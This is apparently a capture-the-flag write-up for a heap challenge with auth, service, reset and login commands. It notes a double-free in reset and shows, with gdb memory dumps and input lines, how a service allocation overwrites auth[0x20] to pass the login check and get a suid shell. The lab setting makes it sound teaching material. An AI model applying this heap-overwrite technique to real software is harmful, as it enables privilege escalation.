# Control heap

## Context

Source code of this chall is complicated, but easier while reading throught asm and debugger.

We can conclude, there is 4 action permited: auth, service, reset, and login.

- auth : malloc auth global variable and strcpy into the malloc.
- service : strdup and copies data into service global variable
- reset : we dont need to. but free things without checking anything, double free vuln.
- login: check if auth[0x20] != 0. If it doesn't it open you a suid shell.


## Exploit:

First, lets auth us. It print out the pointer in the heap:

```c
(nil), (nil) 
auth AAAAAAAA
0x804a9c0, (nil)
```

Lets see what stored a the address:

```c
x/20wx 0x804a9c0

0x804a9c0:	0x41414141	0x41414141	0x00000a41	0x00021639
0x804a9d0:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a9e0:	0x00000000	0x00000000	0x00000000	0x00000000
```

Well, 16 byte. So now, if i do a service, it gonna malloc at next address on the heap: 0x804a9d0, so strdup should write data here.

For login (and trigger a suid shell), you have to write data at auth[32] so 0x804a9d0 is auth + 16, i need write 17 more byte. 

```c
service BBBBBBBBBBBBBBBB ('B' * 16 + '\n')
0x804a9c0, 0x804a9d0 

gef➤  x/20wx 0x804a9c0
0x804a9c0:	0x41414141	0x41414141	0x0000000a	0x00000021
0x804a9d0:	0x42424220	0x42424242	0x42424242	0x42424242
0x804a9e0:	0x00000a42	0x00000000	0x00000000	0x00021619
```

```DWORD PTR [eax+0x20]``` = '0xa42

Its win.